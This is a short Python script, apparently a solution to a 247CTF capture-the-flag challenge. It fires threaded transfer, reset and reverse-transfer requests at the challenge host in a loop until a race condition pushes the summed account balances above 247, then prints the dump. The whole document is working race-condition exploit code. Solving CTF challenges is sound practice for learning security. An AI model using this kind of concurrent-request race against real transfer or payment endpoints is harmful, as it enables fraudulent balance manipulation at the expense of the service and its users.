import requests, threading

def p1():
    requests.get("https://2d85e1695fe6e8ae.247ctf.com/?to=2&from=1&amount=247")
def p2():
    requests.get("https://2d85e1695fe6e8ae.247ctf.com/?reset")
def p3():
    requests.get("https://2d85e1695fe6e8ae.247ctf.com/?to=1&from=2&amount=247")

while True:
    t1 = threading.Thread(target=p1)
    t2 = threading.Thread(target=p2)
    t3 = threading.Thread(target=p3)
    t1.start()
    t2.start()
    t3.start()
    out = (requests.get("https://2d85e1695fe6e8ae.247ctf.com/?dump").text)
    out_text = out.splitlines()
    res = 0
    for line in out_text[1:3]:
        res += int(line.split()[1])
    if res > 247:
        print(out)
        break
    print(res)
